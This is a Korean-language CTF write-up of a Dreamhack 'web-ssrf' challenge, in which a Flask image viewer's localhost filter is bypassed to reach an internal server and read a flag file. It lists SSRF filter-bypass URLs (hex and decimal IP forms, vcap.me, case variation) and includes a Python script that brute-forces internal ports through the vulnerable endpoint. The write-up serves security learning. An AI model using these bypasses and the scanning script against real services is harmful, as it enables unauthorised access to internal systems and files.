## 📍web-ssrf

```
flask로 작성된 image viewer 서비스 입니다.
SSRF 취약점을 이용해 플래그를 획득하세요. 플래그는 `/app/flag.txt`에 있습니다.
```

이미지 뷰어가 뜬다.

![](Attachments/EA1E17AF-74F5-4E05-8C79-B06D89EE62D0.png)


#### 소스코드

입력값이 `/`로 시작하는 경우 `http://localhost:8000` 뒤에 추가하고 GET 요청을 보낸다.
입력값이 `localhost` 또는 `127.0.0.1`을 포함하면 로컬에서 `error.png` 이미지를 읽어와 반환한다.
이미지 데이터를 가져오는 데 성공하면 Base64로 인코딩한다.
URL 요청에 실패하면 로컬의 `error.png` 이미지를 읽어와서 Base64로 인코딩한다.
![](Attachments/50FE09BD-B167-40FE-B89A-484ED94B92A1.png)

파이썬의 `http.server` 모듈을 사용하여 HTTP 서버를 생성한다.
서버가 실행될 호스트 주소는 `127.0.0.1`이고 포트 번호는 1500부터 1800 사이의 랜덤한 포트를 선택한다.
![](Attachments/062ACFF7-6AD3-4567-9D79-3C8F2C69A8A7.png)


#### 취약점

`img_viewer`는 이용자가 전달한 `url`에 HTTP 요청을 보내고 응답을 반환한다.
이때 서버 주소에 `127.0.0.1`과 `localhost`가 포함된 URL로의 접근을 막는다.
이를 우회하면 SSRF를 통해 내부 HTTP 서버에 접근할 수 있다.


#### 해결
##### URL 필터링 우회
1. 127.0.0.1과 매핑된 도메인 이름 사용하기
	- 도메인 이름을 구매하면 이를 DNS 서버에 등록해 원하는 IP 주소와 연결할 수 있다.
	- 임의의 도메인 이름을 구매해 127.0.0.1과 연결하고 그 이름을 `url`로 사용하면 필터링 우회가 가능하다.
2. 127.0.0.1의 alias 이용
	- IP의 다양한 표기 방식을 이용한다.
	- `127.0.0.1`
		- 각 자릿수를 16진수로 변환: `0x7f.0x00.0x00.0x01`
		- 위에서 `.`을 제거한 `0x7f000001`
		- 위를 10진수로 변환한 `2130706433`
		- 각 자리에서 0을 생략한 `127.1` 또는 `127.0.1`
	- `127.0.0.1`부터 `127.0.0.255`까지의 IP는 루프백(loop-back) 주소라고 하여 모두 로컬 호스트를 가리킨다.
3. localhost의 alias 이용
	- URL에서 호스트와 스키마는 대소문자를 구분하지 않는 점을 이용한다.

필터링을 우회할 수 있는 localhost URL 목록 ⬇️
```
http://vcap.me:8000/
http://0x7f.0x00.0x00.0x01:8000/
http://0x7f000001:8000/
http://2130706433:8000/
http://Localhost:8000/
http://127.0.0.255:8000/
```


`http://Localhost:8000/`을 Image Viewer에 입력하면 어떤 이미지가 로딩된다.
![](Attachments/711EBE33-8671-417A-9DE5-0F60D4A45CAA.png)

개발자 도구로 살펴보면 Base64로 인코딩되어 있다.
![](Attachments/4E8379C5-947B-441A-8C0C-2390D11E9F92.png)

Base64 디코딩 사이트에서 디코딩해보면 다음과 같다.
![](Attachments/ED3ADF80-89D0-49FF-978E-1047576C7ABD.png)
문제 인덱스 페이지를 인코딩한 이미지임을 알 수 있다.
따라서 위 URL은 필터링을 우회해서 로컬 호스트를 가리킬 수 있는 URL이다.

##### 랜덤한 포트 찾기
내부 HTTP 서버는 포트 번호가 1500 이상 1800 이하인 임의 포트에서 실행되고 있다.
`error.png`를 보여주지 않는 포트 번호를 찾아야 한다.

브루트포스 파이썬 스크립트를 작성해서 실행한다.
```python
import requests

for port in range(1500,1801):
    url = "http://host3.dreamhack.games:15033/img_viewer"
    img_url = f'http://Localhost:{port}/flag.txt'
    data = { "url" : img_url }
    response = requests.post(url, data=data)

    if "iVBORw0KGgoAAAA" not in response.text:
        print(f"port: {port}")
        break;
```
- 필터링을 우회한 로컬호스트 주소에 1500 이상 1800 이하의 포트 번호를 넣은 `img_url`을 `data`의 `url` 키로 추가한다.
	- `data`: 서버에 보낼 요청 데이터
- 지정된 `url`에 대해 POST 요청을 보낸다.
- 응답 텍스트에 특정 문자열(`iVBORw0KGgoAAAA`, PNG 이미지의 시작 부분)이 포함되어 있지 않으면 포트를 출력하고 반복문을 종료한다.

스크립트를 실행하면 포트 번호가 1616이라고 나온다.
![](Attachments/AA4F8DA0-98B6-4F3E-A219-A2AC037C4ED5.png)

![](Attachments/56FCF624-670A-4F15-B1DB-8B4D93C620CE.png)

Base64로 인코딩된 이미지를 해석하면 FLAG가 나온다.
![](Attachments/9A0B7D2A-C67A-441E-9A5B-4050BA886902.png)
